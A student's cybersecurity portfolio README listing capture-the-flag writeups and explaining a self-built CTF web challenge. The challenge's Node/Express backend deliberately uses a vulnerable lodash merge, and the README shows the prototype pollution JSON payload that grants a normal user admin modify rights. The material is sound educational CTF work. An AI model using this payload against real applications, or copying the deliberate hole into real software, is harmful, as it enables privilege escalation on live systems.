# Daniel Chung's Cyber Portfolio

## Writeups

Over the course of my collegiate experience at the United States Military Academy, I have competed with the Cadet Competitive Cyber Team (C3T) in multiple Capture-The-Flag and Red VS Blue Competitions. 

The following are writeups for some of the top challenges I have solved in competition, found in the writeups folder.
- Smuggling Mail 
  - A web challenge that required players to smuggle requests past Varnish to the backend, then exfil the flag from the server.
- Ninja
  - A web challenge that required players to use XSS, SSTI, and python subclasses to exfil the flag from the server.
- Gatekeeping
  - A Web challenge that required players to find a gunicorn vulnerability to receive a decryption key for a flag.

## Code examples

An example of code I would like to submit includes the web application I wrote for a West Point internal Capture-The-Flag competition. The web application allows users to post messages to a message board, and the messages are displayed on the home page.

Players were provided the source code for both the frontend and backend, where the frontend was written in Python utilizing Flask, and the backend was written in Node.js utilizing Express. In order to solve this challenge, players had to find a vulnerability in the backend that allowed them to modify the admin's post to a specific string of "hack the planet".

The intended vulnerability was prototype pollution of the user object, which allowed the user to modify the admin's post. In this challenge, the admin user had a parameter called `canModify` set to `True` which allowed the admin user to modify all posts. The normal user did not have this parameter, and could not modify the admin post. 

The vulnerability was intentionally placed using the `lodash` package, version 4.17.4 for node.js as follows:

```js
const _ = require('lodash');

const users = [
    { name: 'user', password: 'user' },
    { name: 'admin', password: Math.random().toString(32), canModify: true },
];

...

const message = {};
_.merge(message, req.body.message, {
    username: user.name,
    id: lastId++,
}); 
```

The merge function of the lodash package is used to merge the user's message with the message object, which is then used to create a new message. The merge function is vulnerable to prototype pollution, which allows the user to modify the user object and give themselves a `canModify` parameter by sending a request to the backend with the following body:

```json
{
    "auth": {"name": "user", "password": "user"},
    "message": {
        "text": "polluted!",
        "__proto__": {
            "canModify": true
        }
    }
}
```

After this request is sent, the user can then modify the admin post by sending a request to the backend with the following body:

```json
{
    "auth": {"name": "user", "password": "user"},
    "message": {
        "text": "hack the planet",
        "id": 0
    }
}
```

The code for this challenge can be found [here](pollution_protests).